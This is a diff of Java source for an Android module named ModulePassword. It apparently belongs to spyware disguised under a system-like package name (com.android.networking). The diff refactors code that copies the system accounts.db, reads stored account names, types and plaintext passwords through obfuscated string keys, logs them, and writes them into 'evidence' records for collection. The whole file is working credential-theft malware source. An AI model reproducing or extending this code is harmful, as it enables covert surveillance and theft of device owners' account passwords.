@@ -14,6 +14,7 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.db.GenericSqliteHelper;
+import com.android.networking.db.RecordVisitor;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.Markup;
@@ -25,11 +26,13 @@ import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 public class ModulePassword extends BaseModule {
+
+	
 	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
 	private Markup markupPassword;
 	private HashMap<String, String> lastPasswords;
-	private HashMap<String, Integer> services = new HashMap<String, Integer>();;
+	private static HashMap<String, Integer> services = new HashMap<String, Integer>();
 
 	@Override
 	protected boolean parse(ConfModule conf) {
@@ -64,6 +67,57 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualGo() {
+		
+		RecordVisitor passwordVisitor = new RecordVisitor() {
+			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+			boolean needToSerialize = false;
+			
+			@Override
+			public void close(){
+				if (needToSerialize) {
+					markupPassword.serialize(lastPasswords);
+				}
+				evidence.close();
+			}
+			@Override
+			public void cursor(Cursor cursor) {
+				String jid = cursor.getString(0);
+				String name = cursor.getString(1);
+				String type = cursor.getString(2);
+				String password = cursor.getString(3);
+				String service = getService(type);
+
+				String value = name + "_" + type + "_" + password;
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
+							+ password);
+				}
+
+				if (!StringUtils.isEmpty(password)) {
+
+					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
+						return;
+					} else {
+						lastPasswords.put(jid, value);
+						needToSerialize = true;
+					}
+
+					evidence.write(WChar.getBytes(type, true));
+					evidence.write(WChar.getBytes(name, true));
+					evidence.write(WChar.getBytes(password, true));
+					evidence.write(WChar.getBytes(service, true));
+					evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
+
+				}
+			}
+		};
+		
+		dumpAccounts(passwordVisitor);
+		
+	}
+	
+	public static void dumpAccounts(RecordVisitor visitor) {
 		// h_0=/data/system/
 		// h_1=/data/system/users/0/
 		// h_2=accounts.db
@@ -102,7 +156,22 @@ public class ModulePassword extends BaseModule {
 
 		try {
 			Utils.copy(new File(dbFile), new File(localFile));
-			dumpPasswordDb(localFile);
+			GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 4);
+			
+			// h_4=accounts
+			String table = Messages.getString("h_4");
+
+			// h_5=_id
+			// h_6=name
+			// h_7=type
+			// h_8=password
+			String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
+					Messages.getString("h_8") };
+			
+			
+			
+			helper.traverseRecords(table, projection, visitor);
+			
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				if (Cfg.DEBUG) {
@@ -113,72 +182,12 @@ public class ModulePassword extends BaseModule {
 
 	}
 
-	private void dumpPasswordDb(String dbFile) {
-		GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 4);
-		SQLiteDatabase db = helper.getReadableDatabase();
 
-		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		// h_4=accounts
-		queryBuilderIndex.setTables(Messages.getString("h_4"));
-
-		// h_5=_id
-		// h_6=name
-		// h_7=type
-		// h_8=password
-		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
-				Messages.getString("h_8") };
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
-
-		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
-		boolean needToSerialize = false;
-
-		// iterate conversation indexes
-		while (cursor != null && cursor.moveToNext()) {
-
-			String jid = cursor.getString(0);
-			String name = cursor.getString(1);
-			String type = cursor.getString(2);
-			String password = cursor.getString(3);
-			String service = getService(type);
-
-			String value = name + "_" + type + "_" + password;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
-						+ password);
-			}
-
-			if (!StringUtils.isEmpty(password)) {
-
-				if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
-					continue;
-				} else {
-					lastPasswords.put(jid, value);
-					needToSerialize = true;
-				}
-
-				evidence.write(WChar.getBytes(type, true));
-				evidence.write(WChar.getBytes(name, true));
-				evidence.write(WChar.getBytes(password, true));
-				evidence.write(WChar.getBytes(service, true));
-				evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
-
-				createEvidenceLocal(type, name);
-
-			}
-		}
-		
-		cursor.close();
-		db.close();
-
-		if (needToSerialize) {
-			markupPassword.serialize(lastPasswords);
-		}
-		evidence.close();
-
+	public static void dumpAddressBookAccounts() {
+	
 	}
 
-	private String getService(String type) {
+	private static String getService(String type) {
 
 		Iterator<String> iter = services.keySet().iterator();
 		while (iter.hasNext()) {
@@ -191,7 +200,7 @@ public class ModulePassword extends BaseModule {
 
 	}
 
-	private int getServiceId(String type) {
+	static int getServiceId(String type) {
 
 		Iterator<String> iter = services.keySet().iterator();
 		while (iter.hasNext()) {
@@ -205,14 +214,7 @@ public class ModulePassword extends BaseModule {
 
 	}
 
-	private void createEvidenceLocal(String type, String name) {
-		int evId = getServiceId(type);
-
-		if (evId != 0)
-			ModuleAddressBook.createEvidenceLocal(evId, name);
-	}
-
-	private boolean unprotect(String path) {
+	private static boolean unprotect(String path) {
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
